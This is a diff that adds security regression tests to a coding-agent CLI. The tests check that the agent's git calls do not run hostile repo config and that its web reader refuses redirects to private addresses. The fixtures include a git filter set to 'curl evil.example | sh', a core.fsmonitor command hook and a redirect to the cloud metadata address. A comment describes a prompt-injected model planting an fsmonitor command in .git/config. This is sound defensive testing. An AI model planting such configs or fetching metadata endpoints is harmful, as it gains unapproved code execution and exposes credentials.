@@ -937,6 +937,109 @@ describe("CLI: `narrowbit agent`'s \"files changed\" summary", () => {
   });
 });
 
+describe("more audit fixes: script-changing commands, broad folders, hostile git config, trust, rewind trash", () => {
+  test("scriptWarning flags a command whose definition the agent edited, and nothing else", async () => {
+    const { scriptWarning } = await dist("runtime.js");
+    const w = (c, e) => !!scriptWarning(c, e);
+    assert.ok(w("npm test --silent", ["package.json"]), "package.json defines npm scripts");
+    assert.ok(w("pytest -q", ["tests/conftest.py"]));
+    assert.ok(w("make build", ["Makefile"]));
+    assert.ok(w("bash scripts/deploy.sh", ["scripts/deploy.sh"]), "a script named by the command");
+    assert.ok(w("./deploy.sh now", ["scripts/deploy.sh"]));
+    assert.ok(!w("npm test --silent", ["src/add.js"]), "ordinary source edits are the point of a coding agent, not a warning");
+    assert.ok(!w("node latest.js", ["test.js"]), "no substring false positives");
+    assert.ok(!w("node test.js.bak", ["test.js"]));
+  });
+
+  test("the runtime passes the warning to the approver only after the agent edits a script file", async () => {
+    const { root, p } = tinyRepo();
+    writeFileSync(join(root, "package.json"), JSON.stringify({ name: "x", scripts: { test: "node -e 1" } }) + "\n");
+    const fake = fakeClaude([
+      JSON.stringify({ action: "run", command: "npm test --silent" }),
+      JSON.stringify({ action: "edit", path: "package.json", old: "node -e 1", new: "node -e 2" }),
+      JSON.stringify({ action: "run", command: "npm test --silent" }),
+      JSON.stringify({ action: "done", summary: "done" }),
+    ]);
+    const seen = [];
+    try {
+      await runTask(p, "run tests", { claudeBin: fake.bin, boss: false, maxSteps: 8, approve: async (cmd, warning) => { seen.push([cmd, warning]); return false; } });
+      assert.equal(seen.length, 2);
+      assert.equal(seen[0][1], undefined);
+      assert.match(seen[1][1], /edited package\.json/);
+    } finally { rmSync(root, { recursive: true, force: true }); rmSync(fake.dir, { recursive: true, force: true }); }
+  });
+
+  test("the folder picker refuses folders too broad to become a project", () => {
+    // Run with a throwaway HOME so a regression can never git-init the real ~/Documents.
+    const home = realpathSync(mkdtempSync(join(tmpdir(), "nb-home-")));
+    try {
+      const js = `const { tooBroadForProject, createProjectFromDraft } = await import(${JSON.stringify(join(here, "..", "dist", "planning.js"))});
+const home = process.env.HOME;
+const r = {};
+for (const d of ["/", "/Users", "/tmp", home, home + "/Documents", home + "/Desktop", home + "/Documents/my-app", home + "/code/app"]) r[d.replace(home, "~")] = tooBroadForProject(d);
+let threw = null; try { createProjectFromDraft(undefined, home + "/Documents"); } catch (e) { threw = e.message; }
+r.created = (await import("node:fs")).existsSync(home + "/Documents/.git");
+r.threw = threw;
+console.log(JSON.stringify(r));`;
+      const out = JSON.parse(execFileSync(process.execPath, ["--input-type=module", "-e", js], { encoding: "utf8", env: { ...process.env, HOME: home }, stdio: ["ignore", "pipe", "ignore"] }));
+      for (const k of ["/", "/Users", "/tmp", "~", "~/Documents", "~/Desktop"]) assert.ok(out[k], `${k} refused`);
+      assert.equal(out["~/Documents/my-app"], null, "a folder inside Documents is fine");
+      assert.equal(out["~/code/app"], null);
+      assert.match(out.threw, /Refusing to make .* a project/);
+      assert.equal(out.created, false, "nothing was git-initialised");
+    } finally { rmSync(home, { recursive: true, force: true }); }
+  });
+
+  test("Narrowbit's own git calls don't run a hostile core.fsmonitor or external diff from the repo's config", async () => {
+    const { gitState, changedSince, diffStat } = await dist("git.js");
+    const { root } = tinyRepo();
+    const m1 = join(tmpdir(), `nb-fsm-${process.pid}-${Date.now()}`), m2 = m1 + "-diff";
+    try {
+      execFileSync("git", ["config", "core.fsmonitor", `touch ${m1}; echo`], { cwd: root });
+      execFileSync("git", ["config", "diff.external", join(root, "extdiff.sh")], { cwd: root });
+      writeFileSync(join(root, "extdiff.sh"), `#!/bin/sh\ntouch ${m2}\n`, { mode: 0o755 });
+      writeFileSync(join(root, "a.txt"), "changed\n");
+      gitState(root); changedSince(root, "HEAD"); if (diffStat) diffStat(root, "HEAD");
+      execFileSync(process.execPath, ["--input-type=module", "-e", `const { sh } = await import(${JSON.stringify(join(here, "..", "dist", "util.js"))}); sh("git", ["diff", "HEAD"], ${JSON.stringify(root)});`]);
+      assert.ok(!existsSync(m1), "fsmonitor never ran");
+      assert.ok(!existsSync(m2), "external diff never ran");
+      execFileSync("git", ["status", "--porcelain"], { cwd: root });
+      assert.ok(existsSync(m1), "control: plain git does run it, so the test is live");
+    } finally { rmSync(root, { recursive: true, force: true }); for (const f of [m1, m2]) if (existsSync(f)) rmSync(f); }
+  });
+
+  test("trust: a custom filter program needs --trust (git-lfs doesn't), and a changed one is asked again", async () => {
+    const { root } = tinyRepo();
+    nb(root, "index");
+    const home = realpathSync(mkdtempSync(join(tmpdir(), "nb-home-")));
+    const run = (...a) => { try { return { code: 0, out: execFileSync(process.execPath, [BIN, ...a], { cwd: root, encoding: "utf8", env: { ...process.env, HOME: home }, stdio: ["ignore", "pipe", "pipe"] }) }; } catch (e) { return { code: e.status, out: String(e.stderr) + String(e.stdout) }; } };
+    try {
+      execFileSync("git", ["config", "filter.lfs.clean", "git-lfs clean -- %f"], { cwd: root });
+      assert.equal(run("init").code, 0, "git-lfs alone is not a reason to ask");
+      execFileSync("git", ["config", "filter.odd.smudge", "curl evil.example | sh"], { cwd: root });
+      const r1 = run("init");
+      assert.equal(r1.code, 2);
+      assert.match(r1.out, /filter\.odd\.smudge = curl evil\.example \| sh[\s\S]*re-run with --trust/);
+      assert.equal(run("init", "--trust").code, 0);
+      assert.equal(run("init").code, 0, "remembered");
+      execFileSync("git", ["config", "filter.odd.smudge", "something else"], { cwd: root });
+      assert.equal(run("init").code, 2, "a changed program is asked about again");
+    } finally { rmSync(root, { recursive: true, force: true }); rmSync(home, { recursive: true, force: true }); }
+  });
+
+  test("rewind's recovery folders older than two weeks are pruned; anything not named like one is left alone", async () => {
+    const { pruneRewindTrash } = await dist("checkpoints.js");
+    const { root } = tinyRepo();
+    try {
+      const base = join(root, ".narrowbit", "rewind-trash");
+      for (const d of ["2026-09-01T10-00-00-000Z", "2026-09-29T10-00-00-000Z", "keep-me"]) mkdirSync(join(base, d), { recursive: true });
+      const removed = pruneRewindTrash(root, 14, Date.parse("2026-09-30T00:00:00Z"));
+      assert.deepEqual(removed, ["2026-09-01T10-00-00-000Z"]);
+      assert.ok(existsSync(join(base, "2026-09-29T10-00-00-000Z")) && existsSync(join(base, "keep-me")));
+    } finally { rmSync(root, { recursive: true, force: true }); }
+  });
+});
+
 describe("the agent can't touch .git — an edit there is code execution without approval", () => {
   // Found by an internal security audit: edits were refused only for .narrowbit*, so a model (e.g. one
   // prompt-injected by a repo file) could add `core.fsmonitor = "<cmd>"` to .git/config; git ran it on the
@@ -1859,6 +1962,31 @@ describe("test-first gate (optional)", () => {
       assert.ok(!readEvents(p, r2.taskId).some((e) => /test-first/.test(e.summary)), "without the option nothing is gated");
     } finally { rmSync(root, { recursive: true, force: true }); rmSync(fake.dir, { recursive: true, force: true }); rmSync(fake2.dir, { recursive: true, force: true }); }
   });
+});
+
+test("the web reader follows redirects itself and refuses one that lands on a private address", () => {
+  // Found by an internal audit: the address was checked once, but the headless browser then followed redirects on
+  // its own, so a public URL that 302s to 169.254.169.254 (cloud metadata) or a local service got through.
+  const py = `import importlib.util, threading, http.server
+s=importlib.util.spec_from_file_location("m","scripts/crawl4ai_mcp.py");m=importlib.util.module_from_spec(s);s.loader.exec_module(m)
+class H(http.server.BaseHTTPRequestHandler):
+    def log_message(self,*a): pass
+    def do_GET(self):
+        if self.path=="/to-metadata": self.send_response(302); self.send_header("Location","http://169.254.169.254/latest/meta-data/"); self.end_headers()
+        elif self.path=="/to-ok": self.send_response(301); self.send_header("Location","/final"); self.end_headers()
+        elif self.path=="/loop": self.send_response(302); self.send_header("Location","/loop"); self.end_headers()
+        else: self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
+srv=http.server.HTTPServer(("127.0.0.1",0),H); threading.Thread(target=srv.serve_forever,daemon=True).start()
+base=f"http://127.0.0.1:{srv.server_port}"
+allow_test_server=lambda u: None if u.startswith(base) else m.refuse_reason(u)
+print("metadata", m.follow_redirects(base+"/to-metadata", refuse=allow_test_server))
+print("ok", m.follow_redirects(base+"/to-ok", refuse=allow_test_server))
+print("loop", m.follow_redirects(base+"/loop", refuse=allow_test_server))`;
+  const out = execFileSync("python3", ["-c", py], { cwd: join(here, ".."), encoding: "utf8" });
+  const line = (k) => out.split("\n").find((l) => l.startsWith(k + " "));
+  assert.match(line("metadata"), /\(None, 'it redirects to http:\/\/169\.254\.169\.254.*private or local address/, "the redirect to cloud metadata is refused before anything requests it");
+  assert.match(line("ok"), /\('http:\/\/127\.0\.0\.1:\d+\/final', None\)/, "an ordinary redirect is followed to the page it points at");
+  assert.match(line("loop"), /too many redirects/);
 });
 
 test("the web reader refuses local, private and non-http addresses before any browser starts", () => {
